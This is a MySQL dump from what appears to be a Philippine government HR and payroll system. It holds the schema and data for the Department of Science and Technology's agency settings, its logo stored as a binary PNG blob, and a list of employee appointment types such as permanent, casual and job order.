#
# TABLE STRUCTURE FOR: tblagency
#

DROP TABLE IF EXISTS `tblagency`;

CREATE TABLE `tblagency` (
  `agencyName` varchar(100) NOT NULL DEFAULT '',
  `abbreviation` varchar(10) NOT NULL DEFAULT '',
  `dtrScheme` varchar(10) NOT NULL DEFAULT '',
  `fixedFrom` time DEFAULT '00:00:00',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zipCode` varchar(4) NOT NULL DEFAULT '',
  `telephone` varchar(50) NOT NULL DEFAULT '',
  `facsimile` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `website` varchar(80) NOT NULL DEFAULT '',
  `fixedTo` time DEFAULT '00:00:00',
  `morningFrom` time DEFAULT '00:00:00',
  `morningTo` time DEFAULT '00:00:00',
  `afternoonFrom` time DEFAULT '00:00:00',
  `afternoonTo` time DEFAULT '00:00:00',
  `salarySchedule` varchar(10) NOT NULL DEFAULT '',
  `mins_before_OT` time DEFAULT NULL,
  `minOT` time DEFAULT NULL,
  `maxOT` time DEFAULT NULL,
  `expr_cto_mon` int(11) DEFAULT NULL,
  `expr_cto_yr` int(11) DEFAULT NULL,
  `flagTime` time NOT NULL,
  `autoComputeTax` tinyint(4) NOT NULL,
  `pagibigId` varchar(20) NOT NULL DEFAULT '',
  `gsisId` varchar(20) NOT NULL DEFAULT '',
  `gsisEmpShare` int(11) NOT NULL DEFAULT 0,
  `gsisEmprShare` int(11) NOT NULL DEFAULT 0,
  `pagibigEmpShare` int(11) NOT NULL DEFAULT 0,
  `pagibigEmprShare` int(11) NOT NULL DEFAULT 0,
  `philhealthEmpShare` int(11) DEFAULT 0,
  `philhealthEmprShare` int(11) DEFAULT 0,
  `providentEmpShare` int(11) DEFAULT 0,
  `providentEmprShare` int(11) DEFAULT 0,
  `philhealthPercentage` decimal(4,2) NOT NULL DEFAULT 0.00,
  `lbStartMonth` int(11) NOT NULL DEFAULT 0,
  `lbStartYear` int(11) NOT NULL DEFAULT 0,
  `agencyTin` varchar(25) NOT NULL DEFAULT '',
  `PhilhealthNum` varchar(20) DEFAULT NULL,
  `Vision` text DEFAULT NULL,
  `Mission` text DEFAULT NULL,
  `Mandate` text NOT NULL,
  `zonecode` varchar(20) NOT NULL DEFAULT '',
  `region` varchar(20) NOT NULL DEFAULT '',
  `AccountNum` varchar(20) DEFAULT NULL,
  `expirationCTO` datetime DEFAULT NULL,
  PRIMARY KEY (`agencyName`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblagency` (`agencyName`, `abbreviation`, `dtrScheme`, `fixedFrom`, `address`, `zipCode`, `telephone`, `facsimile`, `email`, `website`, `fixedTo`, `morningFrom`, `morningTo`, `afternoonFrom`, `afternoonTo`, `salarySchedule`, `mins_before_OT`, `minOT`, `maxOT`, `expr_cto_mon`, `expr_cto_yr`, `flagTime`, `autoComputeTax`, `pagibigId`, `gsisId`, `gsisEmpShare`, `gsisEmprShare`, `pagibigEmpShare`, `pagibigEmprShare`, `philhealthEmpShare`, `philhealthEmprShare`, `providentEmpShare`, `providentEmprShare`, `philhealthPercentage`, `lbStartMonth`, `lbStartYear`, `agencyTin`, `PhilhealthNum`, `Vision`, `Mission`, `Mandate`, `zonecode`, `region`, `AccountNum`, `expirationCTO`) VALUES ('Department of Science and Technology', 'DOST', '', '00:00:00', 'General Santos Ave., Bicutan, Taguig City', '1631', '8372071-82', '8372937', '  ', 'www.dost.gov.ph', '00:00:00', '00:00:00', '00:00:00', '00:00:00', '00:00:00', 'Bi-Monthly', NULL, '00:00:00', '00:00:00', NULL, NULL, '00:00:00', '0', '', '', '9', '12', '100', '100', '50', '50', '2', '5', '0.00', '1', '2005', '044-000-553-203', '140039100007', 'A prosperous Filipino nation whose socio-economic well-being is assured through competent and responsible use of scientific knowledge and technological innovations.', 'To direct, lead, and coordinate scientific and technological efforts in the country and ensure that these result to the maximum economic and social benefits for the Filipino people.', '', '', '', '     ', NULL);


#
# TABLE STRUCTURE FOR: tblagencyimages
#

DROP TABLE IF EXISTS `tblagencyimages`;

CREATE TABLE `tblagencyimages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `agencyLogo` longblob NOT NULL,
  `agencyName` varchar(70) NOT NULL DEFAULT '',
  `filename` varchar(50) NOT NULL DEFAULT '',
  `filesize` varchar(50) NOT NULL DEFAULT '',
  `filetype` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=58 DEFAULT CHARSET=latin1;

INSERT INTO `tblagencyimages` (`id`, `agencyLogo`, `agencyName`, `filename`, `filesize`, `filetype`) VALUES ('57', '�PNG\r\n\Z\n\0\0\0\rIHDR\0\0\0`\0\0\0`\0\0\0�w8\0\0\0	pHYs\0\0\0\0\0��\0\0\nOiCCPPhotoshop ICC profile\0\0xڝSgTS�=���BK���KoR RB���&*!	J�!��Q�EEȠ�����Q,�\n��!���������{�kּ������>�����H3Q5��B�������.@�\n$p\0�d!s�#\0�~<<+\"��\0x�\0�M��0���B�\\���t�8K�\0@z�B�\0@F���&S\0�\0`�cb�\0P-\0`\'��\0����{\0[�!��\0 e�D\0h;\0��V�E\0X0\0fK�9\0�-\00IWfH\0��\0���\0\00Q��)\0{\0`�##x\0��\0F�W<�+��*\0\0x��<�$9E�[-qWW.(�I+6aa�@.�y�2�4���\0\0������x����6��_-��\"bb���ϫp@\0\0�t~��,/�\Z�;�m��%�h^�u��f�@�\0���W�p�~<<E���������J�B[a�W}�g�_�W�l�~<�����$�2]�G�����L�ϒ	�b��G�����\"�Ib�X*�Qq�D���2�\"�B�)�%��d��,�>�5\0�j>{�-�]c�K\'Xt���\0\0�o��(�h���w��?�G�%\0�fI�q\0\0^D$.Tʳ?�\0\0D��*�A��,�����`6�B$��BB\nd�r`)��B(�Ͱ*`/�@4�Qh��p.�U�=p�a��(��	A�a!ڈb�X#����!�H�$ ɈQ\"K�5H1R�T UH�=r9�\\F��;�\02����G1���Q=��C��7\Z�F��dt1�����r�\Z=�6��Ыhڏ>C�0��3�l0.��B�8,	�c˱\"���\Z�V����cϱw�E�	6wB aAHXLXN�H� $4�	7	�Q�\'\"��K�&���b21�XH,#��/{�C�7$�C2\'��I��T��F�nR#�,��4H\Z#���dk�9�, +ȅ����3��!�[\n�b@q��S�(R�jJ��4�e�2AU��Rݨ�T5�ZB���R�Q��4u�9̓IK�����\Zhh�i��t�ݕN��W���G���w\r��ǈg(�gw��L�Ӌ�T071���oUX*�*|��\n�J�&�*/T����ުU�U�T��^S}�FU3S�	Ԗ�U��P�SSg�;���g�oT?�~Y��Y�L�OC�Q��_�� c�x,!k\r��u�5�&���|v*�����=���9C3J3W�R�f?�q��tN	�(���~���)�)�4L�1e\\k����X�H�Q�G�6������E�Y��A�J\'\\\'Gg����S�Sݧ\n�M=:��.�k���Dw�n��^��Lo��y���}/�T�m���GX�$��<�5qo</���QC]�@C�a�a�ᄑ��<��F�F�i�\\�$�m�mƣ&&!&KM�M�RM��)�;L;L���͢�֙5�=1�2��כ߷`ZxZ,����eI��Z�Yn�Z9Y�XUZ]�F���%ֻ�����N�N���gð�ɶ�����ۮ�m�}agbg�Ů��}�}��=\r���Z~s�r:V:ޚΜ�?}����/gX���3��)�i�S��Ggg�s�󈋉K��.�>.���Ƚ�Jt�q]�z���������ۯ�6�i�ܟ�4�)�Y3s���C�Q��?��0k߬~OCO�g��#/c/�W�װ��w��a�>�>r��>�<7�2�Y_�7��ȷ�O�o�_��C#�d�z��\0��%g��A�[��z|!��?:�e����A���AA�������!h�쐭!��Α�i�P~���a�a��~\'���W�?�p�X\Z�1�5w��Cs�D�D�Dޛg1O9�-J5*>�.j<�7�4�?�.fY��X�XIlK9.*�6nl��������{�/�]py�����.,:�@L�N8��A*��%�w%�\ny��g\"/�6ш�C\\*N�H*Mz�쑼5y$�3�,幄\'���L\rLݛ:��v m2=:�1����qB�!M��g�g�fvˬe����n��/��k���Y-\n�B��TZ(�*�geWf�͉�9���+��̳�ې7�����ᒶ��KW-X潬j9�<qy�\n�+�V�<���*m�O��W��~�&zMk�^�ʂ��k�U\n�}����]OX/Yߵa���>������(�x��oʿ�ܔ���Ĺd�f�f���-�[����n\r�ڴ\r�V����E�/��(ۻ��C���<��e����;?T�T�T�T6��ݵa��n��{��4���[���>ɾ�UUM�f�e�I���?�������m]�Nmq����#�׹���=TR��+�G�����w-\r6\rU����#pDy���	��\r:�v�{���vg/jB��F�S��[b[�O�>����z�G��4<YyJ�T�i��ӓg�ό���}~.��`ۢ�{�c��jo�t��E���;�;�\\�t���W�W��:_m�t�<���Oǻ�����\\k��z��{f���7����y���՞9=ݽ�zo������~r\'��˻�w\'O�_�@�A�C݇�?[�����j�w����G��������C���ˆ\r��8>99�?r����C�d�&����ˮ/~�����јѡ�򗓿m|������������x31^�V���w�w��O�| (�h���SЧ��������c3-�\0\0\0 cHRM\0\0z%\0\0��\0\0��\0\0��\0\0u0\0\0�`\0\0:�\0\0o�_�F\0\0)�IDATx��}yt$Wy����U�/�n�[j�͌�Y<x�/<!6�k���!/$�?&�`�����m��6�l�Fk����������VK�m$����Q�\\���������R����u��j�4�B)\0`��q\\�a�I�2����\0�1��,WdY��V?�ۂ�T���|>0��\\Y,v�Şj�\"*�\nJ5B��,A�l6ۤ�fv:���N�3�e������,Q?��SQj�ѴL\0\0xޤ�͖��nv�\\G�N��,�0���<�lT(��D\"~��l�]�xlw�\\F�ZC�V�$I�e���R\nB���d�_<A��l���:�?����-��F.4�󛗯PU��U��*U�]�(�MQ8(2AM���_���\n\0`Y�>w�(���;::����}��?\\(�ѹwML�$����\"\n�\"��\n�����\n$I�$I� �8��O�j��f���p��p�f���i�z{����=���m��yQ(��w(J�$��]��*P�i�VI�����������`Y�6�������1�x�\\�Թ0 P,���O=03��fsH��H$�H&�H����r(�J(�˨�jPU���a����/����z��������r��-�ٱc�=��_��t���]��L�b�E ��_\r�A�T�@�H���䋟��\ZE���Á�ZZZ��=�s��u�=O��4�����?y���2�4b�8fg�0;;���y�R)d�Y��T�U(�UUa�n�	�eY�<����������mho����RٝJ%ٱc��m�U���_< K�ߩTv��r@\"$�E\"I��T��D ��J@i�-���fUn��b^f�A�JeW:��������m�8!dl�\Z�iZ���\'>sf��D\"�HdSSS�Ø��\"�ɠT*C�$(���C���p��a���r����G(ԉ��ntv�������;�g�+��q���I�鿖j��=�c����0?��A��A�\0�X��6!���e����dYn��b�K~+B�Ntww����>���K.��6�7��a\rPUu�ر�������b||cc��È��(����a��;EQ�(\n$IB�\\A.�C&�E&�A>�G__/E�.I�\r���d�n���_)��H�(\"��	`r\n���P*� +<O`��P��U���E��\nY�Q.����Ng�N�������EQvH���{��a5&p�E9\'N�����`$2���Q���\"#�J�\\.C��M�UUQ�T`HY�\\F�\\j�2Ji\0�?߷�k�U\n�g����X��\0FG��I \Zr9@�\0E����{�?ShD_ì6wUU�(�Ys�e��6\0O��w������>��gΌ�Dfp��0���155�t:�Z���ԟ�P�r��.\nc�&��d2���K�ް^�p�����wG���(���:�q�Tj���l]s��4�]����=(��^�733���&�����������0&\'�\Z�ov�[9TUE�Z��i�gǁ�����;v�g���С���J��&Ӊ�$0>�@�-��5�β�N�������fittr�앧N��D\"���	���6$�x�����Z�\"���������o�z}o�z}��\"��ҵ�꥟M&��	�S���1�����!�Js�W�A\0ϟ����<������	�R��ԉ�d2�Dfp����02�,j��y\'~�$	�\\�pgΌ5�����(�2��9�����##��I$�?񗛻A���0��N���gEq4߻��x�ht��%099���i�RiT���fvV��Z��l6�H$���)D�Q$q.��@`���R��4����v^��Zs�d��D\"���l��\"��\0��b��i=��ß��򘛛E8F2�D�\\�r�{�R2�D8���,2�,��F�R�j�p���Z��_�Y��\rS��(�a���_!��	�T\Z�H��s�d28sf�/$��v����Ʉ�J�133�h4�B��%��f��R��X}\'	�r9��ξ���r��ו��d������j^ܹ��/�=�/`nn�]K�����T*!�H \Z�W��Ŝ�������#O ��czz򝚦u�T*mw�r���<E&M ��YDӯ�\n~�C�e�ryD�Q��	��y�̄o�4m[��Z5�Ew\n�zb-�J�z�L�r6�R� �ZH����Y���n\0���~]���&�@t� �dP�hPd��h\0��L}Y���ca�)$����9e+����fsW��e�r9���r9��Z�\\u.\nH$��H�R���}-\0d2��$A,F��Sd2\Z�s >�K���\04\nPJ���*�R\'|\Z�\\�j\r�T��: �I��V��X,!�͢X,��H�S+�uI���BL?s��;�;_�JR��@�L�2f�\ndi�w6��O���\Z8���@eY(��)s�U�r9����Z!s���b��M�dT��jUPJa2���x[aK�a85�cq�����|�h<v�+�y��b2�h�j�;	�1��4=\0�C\Z�Uc�A��{�M��$I(�(�udwj����4��T*��I��5�\'K��˩�A\\����Z�5��\\Uۨ+닜8�É\'���Q�� ���mV\n�e ����4\n0@)���k��A�L�6ǔ�FXZ�VQ��P.�I����(NY����d��4�܈�0:��/B4MkTǌ:�Z��忟�;�*\n�<�A��/�L,�y��\0,�s�:C(T�@�umb+_)�\Z�Y? IR���(2E�p���F���\n��ju�B�jC/Z�]��F!ø�W����Fq��40�i���f���R�aP���~�Y���%��h�$\rQS�M&8��?w�~�x��0Z8JU�a�i�H�-���r#�Xr�F(����ĀP�����\"�X,���,�쫯�ֺ�wɊ\"YV �5�R���C�G�����e����Xt�e���)�cT�a�H*�jvh�{B��\Z4M�,K��,��M�!��RHj����qf���������\'\n&Q������Z�M�ʰ\0��\0X,��F~x���i��W�t�\nkX��\Z�e��$I�/����n��#��,w�F��ӧ�=�dY^�fތ3n���@�t�Ҳ<O!&��eU�2��ۏ�m ��c	D�X���*�r�Љ��(��|>����Q\0���lU�U,�M��M�^`]\"Ö9\0�8��8���`�oT@S5�&)]nƻRh��,��<�1�.\'̈́���*!(���p8|���f�\\�����Z����J�77�qo��q\\�\0Ad\'i���X�<��b5��z^E�!\0Y6�,C����n�$�d^2�Litt�C���������cX6��R0S�a2� �f�LB����WD8�tT�EݨKP[�%ɺϐe@UUT\nPB�,�e�J����lvxxĒN�1h�̐i�ҿ�b��e��j�(�p:�c,������ \0��XD<�;׵��	��C(ÃRu��\r���Lh�����Z�\\�����V������5̏(\n������EN��(�)f�A�E\n����8\\,���#��.#����@ԕ��v�/���g���_�e<���j��ʴ��P��`����x�t: �\"ZZ�O.*����/L�R��\0�~���L����4H�4}nt�h�T]i�p�R��3ӣG��eYƓO�<�Մ۪a�~������	��	��ux��J�Lч�v��8�<�)Z�w����\'�x�T�X���8v���G�f��f�����p��������t:\nu�˲ų�P0�a�(����v\r�\0`��Y�M1aLB���V�x�G��i�T�׾���f|��z;�~����}��l��}�֔E��ʽ/��̣n7A(Ġ�����f}�{���*&4�B{����㜢�Q���x���w�����Ӟ��n����=���AOO߯,�芆X��lU��==@W�Ң��[��ڰL�d2���5Mk4����b����{��A�\r�;v����ۃ`0�˅�޾{�Rc\0\\~��ӂp��n7��M�m�����0�9�\'��S���鹹�Fln�!M������СC��-�&�	6��`}}}����ۂ;v}U�Sk�\"�\\sɗ�֩�����;v�����L`�/��R���?�~���T�A����@h~~�\"߆@ ���>���!����TWW�}X���<�\\�����#� �};�� ���|z���.�B066&�q�]���t��H$����}���F��6�l۶\r��;��Յ��vi׮=�\"�L�;\Z�W��\"�t�\'B!`�N`�`�6�`;�tR�\n��F�\0�W��bm�8�y$	�v�mr<_dr��J)�~�����kx����.Ҍh��v������ؽ{W����{�M&��Ȳa�j�����>|%!��dٖ]���bN`z�A4����*�*���D�̹�����w\"��-�ܒ:y�dKs1������i.~����a��O�{ｻ��E��3���r��a6��v��ޮ����~tuu���\r|��j]q�䚆�Uο���W2L�a�\r�I4�\\��K13K0?K�L1��)L&������,�R\"f���o�?~����,-i\Z�7�o8�|p�$�N}�3��4ʣ�x��W-� ����m6+|>:::��ۃ��.�����о[�v�KXe��,��}��\0��С�0��=`�\n�	�ڀ� E,���K����G\0(�8v#y�����S������xC�\r,׭a0A/+.0�ᇿ�sxx$���޹m�6�j�eDcU�S\n�O�Y��f�����G{{�P��Ax�-���=�s�%��5W���d���/=������g,���N��\'�Łh� ��P�HC(X�5`���r\Z�N���������4l}��]M��}�q�,�g�}������>y�]�z���\'�X��`}���b������ϋ@�\r~��Ow}�������}q������_~��?(��?�<D�[r9�ZUφJ�Mc���J��*��������655u�\rӲZ�ظw�Y�4\r�T\Zw�u��\'����;���v�5�t��p�&�b#�t:�usӎ@ ��V?�n�������c����s���p0��׼��\0~���>?�7k��z��\\��Vh\Z�j�B�2��]�T0J)���*?��Oƿ���\r����0���^��4s5k����e�F5�І���7�g�y�_~E�-oyK�����|�&�L&k�Z��b=�\n�����΀6�����������06\0ܱ�h��W�	�Kǎ�t���H;��_UV�RU:se.�;�Ng�(2*�r1��F��(�=�ܳ�^x����w7�����R�^�J��QFX�9U�@�Ç����G���V�߿o���ˊ}}}V��G�_͖|>_t:\0l6��;14�wj׮�G�������ϙLB�@Lي�Tw�T�X,�a�ꫫ�p�|��gs�eᰏq8N�J�Rinnnltt�#�N�:<99��ͩ���j%��R��R\'ݬm�����L�S������s�10�/��s�?���=��bS.�sPS�>o�֬nWk��k���W�i���%�,K޹��?����=	��] ss�H&�(PU�����W\\�pD�4D�Q;v���O>���W�ܕH$\ZLXj6���f�.�y�f����r>���[�������*˥��2�v�L��g0xd������<\"ɷ��$Se��rR�\'���[�][���/�7qA�(ʞ����\'&��*�J\"��#�L!\Z�b~>�D\"�|>���Z�մ���0�� ����\r7܀X,��~��/}��MO��q�\"i5���W�#����1`�ޡ�{��W�7��\r���o�!���Uь\Z�j\Z*e32�P� ���s䭄���_N>b6����+���|3�;�N]�����bQK&�E2�B,�=�H �N�X��#4M��6���-��|>�y�Co{����/~���P�Zm4�6���EC˙#��MP::���O�������Ų�k� �^l�\nob!K�j���	�(�d�$u��f�󩧦1����W�o9(��c�:y���L��󘛛���,b�(R�4\n���RC�x���dZ�&X)�`4���n��?}j覛n�~�c�;ڢi��(�46���6wf��މv뭷N�ӟ�\n]g��5P��WT7kbY���R��b1\r�4�H��~O�;e�ۡCG��k.�֖1@��}Ǐ����ɉ�X�pS���\'���P���aA`2���Lc��r�������o�я~�O~��}���X�A/�o����e6���}n��xG�-��i��-��R�ѭd��P`�JQT�s�\Z�3mm@g���Ep�/}�С�뜎�_��\'o��$x��#?	�����s���8\"��J��Y��	rnMR��Y�V�����x</}�_2\"\Z�$���m\"�a~\\.��oD���ڞ��Vn(��U#�$�r	�d�|� ��1!�$��(����ηj�y��#���.�o����9z��ǧ�����a���bt�\"�2�,*�ʪ\0M�I��g|���8����/�,�ˈ\Z�4@���߈���׶-g���xW��F=+�4@��\nP��\"��i�e	J%\r�� ����<���_��A�@)�=q�أ����a�:u\Z###�#���k\"���b�H�����\\.��W���W\Z�g�&(���@�\0��ᡇ�y�k�����I�����܌�����HA�Tk:䙦ttxw���K/�p���>m�螘8s���؞�ٹ:P�����fs��B������㓿��/{B�o�\0�eq�����|��}jn���Q��~��`�i��a*_p�r{V�$�L�|����\'066���Q��d��W��`_�җz|>�\"[o���-��2������B�UU�W�LSS�����E<NQ*���С��]����<u����L���ÝA.����-��������˲R�	�x�^�{�]k~��#q�R��402���L��V��g�}~�j螛�}w<3E�QLNN5��\nZͯ�z�[v_u�U�c0��я����ټ�L04az\Z�\0��bQ@��vϊPU�666zW6����\"�0�*���\nZ�n�����η��W}�;�ٷ�}�[��e=<�����\0�4A�\Z|�3�}�e�GoI��H&����C,G�\\���,0�����j���k�u\rЯ;�cJ�k̛ռ�0�X�+�ሁ��@�[޳�ggg�^,�H$�E����h�j�o��ˆ	r�=��?{s��]2{�2��i�F�hLC.G Im�>��Z1�R)�F���B��T*�T*�R�|^M�F���7W_}����\nB����Ͽj�fcs\"���:��ZO�4�\\a�LiH�	r9�VQ*�s���k����|>�MϹ�����ݎ�/�y�]w����ٹΩ�MT�Ѭ�<ӷc��m`T�|� �rY�J�4�u���d.7�jr9�{+�+M�R�N���9�Þ={�[��^.!J��K�lm��s���R���l�T)�y���p�.\n۪�\Z��\0��-��3Qm�r��������moiiAOO��<JPJXMkj�$M��B�*����B�\"_�(���)�n\0`TU���NI�P�TP�T6�|��0���ƿ�m����\0`@���\Zؖ1��MvW�2��\Z�\")����\\S	�-�!���i@�BP*PT*��A�H\'\00���,h�H��E�����lyTb|���wv�o�~���F�\"�Q\r���$�}��FV�/`׸Sǵ��b�A�L I������4U4:�ey��x��1r5<obȖm��S�V���ڵ���\Z��峰�Kz�S�\0��\0O\r��V�nʤ\ZP�0(���T\0p�Rn	�ʖ9M�������l�Ja)���>��cT�^J�J)�L&�#�x|Q�f�~�c����N�\\.ϣT�HU�B�(!��6�	!�\Z!��iŒ@JeA��,��J�e3�q���ԓ��ȇ���zd��7�Q��UL��a�P�nM� %`\0Ma����Q�����q�҉�ҩ3���l�b�~����\n�e?���� ��Y��վ�ZM2馺J�E�x\rC��*�P�t�Z��KҥPՎ�t)�0Rs!�(ho4m��$	���JM;����C���4_Z%�O�%`XMU@���4Ü���T��M,a2�P,��|ZF߉Y��(���i�(�h*d�E�AUeP��a��8>k2	u�2�Xo���:��):8���%<G�z�d���P\r:R�(R�-� ��/\n-\r�2��ql�g�t�F|�Bt��Ou��X�-�l�9��4p�9�۔�ͱ�T�*�e\n�%�B����\r��+��qQ���U��9����ey/��G��2�V�����!C��q�\"2ԃ=y(\"L&!�������(�v�vA@�R�Tf$�\niV����]YOA\0�B`�����&��;���a\\�Kē�\'�A�TD*�n�}���V�@8���b��j� p:c,�9\0p�=��x�~����Ba�8i��ʲ���==+�\ZT�����3��	Р����%�yӿ{��=95=�ߧO\r�^Q4d2i��͢P(,�yqӀ�q8���0��p�</D��q�݇Dq�8����)*�F�i�0���9�� �z���}��]�=\0�����|��������_���J�8�~r�W#&��x�X\'�͖	��?c�������\r�ż�4B#�i\n����D\rEk+��8�5�|�/\0@�s�P�����EK��u����0E�^o�N\'\\.7���TGG�[v�\r>���mp�\\[$I���u�Ѐ����@[�����ؓ���8Sl����;N�~�~+�N���}+,\0��\r�\Z���Î���X�-73\0��m�s�[��z������ji��l�%6�\0�EEk+A����O`�i���==���}�@���nwc�~�oK����,�f3|>_}^~��tt��R�\Z����r9��.;��z!��EQg��q)|>�]\Z�B<-f��O��-�Zad�}i��3	�e)ˍ���B�x�������l[�+��r0����������Ӎ���ݮ����M^G�u������@p8j�Xb����H/�����Ѓ~[�y�.�� \\�<��р�	p�����M{ʸ%*sj׮K>��e���ՉB��h=704/�EQ\'~W�}EW7S�,\Z��������Į]�?�ͦ���Չ|>�h��D���v������^ov���o� �,�ޥ���~�}��u�$�lhdYi����E�����\n�-��6��~{z��oi��|۶���$��J��j�q��T|�����ߏ��~��������|\0ke`j``�ߖJ�m��l36^PJ133�x����8]�=��S\'���\n�#q��߹sp_r���ڶm��R��cEQ�eYj�\"����y��3\nP:\\M۷o���vtv���ޑߵ�w,Wí�e��\\r�m�Z�IUU�F���9D\"3�F��tN���1^�X\0���\'�\0�+5�pL޶w�e��$��=��5M�,�a��Ap[}\Z,�q����A���cpp;zzz�����=�&�7���߮�D^\Z\Z��FM�~�0���8���قH$�8Sx}%L�p�Sz���p,�I\0�N������������A[�pď;o�첃g���^ػw�(�?!������333��Cތ6U?�ł���@��.�8p��Mf������3�ۿ��יL��8��6��p:p�݈D\"��b����2˥�J@a8�L\ZD��� �x4��2��:	�A��Z�?r:cw��wp|c�P|n���n�y���w�����˅���b1��&7���\0kFN1Y�P��]�p5�{���b��\nŭ�T��CC�o����y�z���8�y��u�~6xx��R���%0�D���	x=��O�omn��!A����Uz`�����9D��޽n�Zm�<w��j������\ZǐW*ճc^Jt���v�������@0؀�9�s����L5M�9,�����8u����x��d�H$����H$��Cʲ�� l�/��W��G�,RXm��q:	�n�����������X[k���>�;��z�������ƁpsϡX,�V�5̪�\r���7\0��Ě�煞�����ǃ]�.�������V2\0\0 ��P$�����[s�,��r�<�����FH&��f�,��\" ��Y$ͨ;�P� ��K0�����L���[�%�����\'&��4�ˣP( ��B��G�PD�R�$I\r�C��A`�Z�p8�t:�t:�p��==}O����c6[&p�d�	��Z��F��<�~k*�tT����\r���Ƹ����y�d8Nϗ�,�{��\n�Z����>�ɞ��$.��T*�����5�J���^�FS��\r\r`Y����8�A?��P(�@���s�	�,�3���Bn_*��.�M�f��k���Y60ϲ��XVͰ�5�ژ�={���ةbM�v�rك�T�l63��f��\r)�Y����t:�n��hK��I����qYl��lqը[UU�,K~EQ\\����\ZN�w��?�EqIRͯ(�GU5�R0�\0�T9�˚L�8ϛ��!����\0��4�9�)�\0\0\0\0IEND�B`�', 'Department of Science and Technology', 'dostco.png', '13520', 'image/x-png');


#
# TABLE STRUCTURE FOR: tblappointment
#

DROP TABLE IF EXISTS `tblappointment`;

CREATE TABLE `tblappointment` (
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `appointmentDesc` varchar(50) NOT NULL DEFAULT '',
  `header` varchar(255) NOT NULL DEFAULT '',
  `leaveEntitled` char(1) NOT NULL DEFAULT '',
  `paymentBasis` varchar(5) NOT NULL DEFAULT '',
  `system` tinyint(1) NOT NULL DEFAULT 0,
  `incPlantilla` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`appointmentCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('T', 'Temporary', 'DOST-ICT', 'N', 'WKDY', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('a', 'Probationary', 'STII', 'N', 'CLNDR', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('P', 'Permanent', 'Permanent', 'Y', 'CLNDR', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Emrg', 'Emergency Employee', 'Emergency Employee', 'N', 'CLNDR', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Cas', 'Casual', 'Casual', 'Y', 'CLNDR', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Prt', 'Part-time', 'Part Time', 'N', 'CLNDR', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('SU', 'Substitute', 'Substitute Employee', 'N', 'CLNDR', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Phs', 'Phase Out', 'Phase Out', 'N', 'CLNDR', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('CT', 'Co-terminous', 'Co-terminous', 'Y', 'CLNDR', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Susp', 'Suspended', 'Suspended', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Lump', 'Contractual-Lumpsum', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('GIA', 'Contractual-GIA', '', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PA', 'Presidential Appointee', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('JO', 'Job Order', '', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('GOV', 'Goverment Employee', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('OJT', 'On The Job Training', '', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('CONT', 'Contractual', '', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('OA', 'Original appointment', '', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PRI', 'Private', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Prom', 'Promotion', '', 'Y', '', '1', '0');
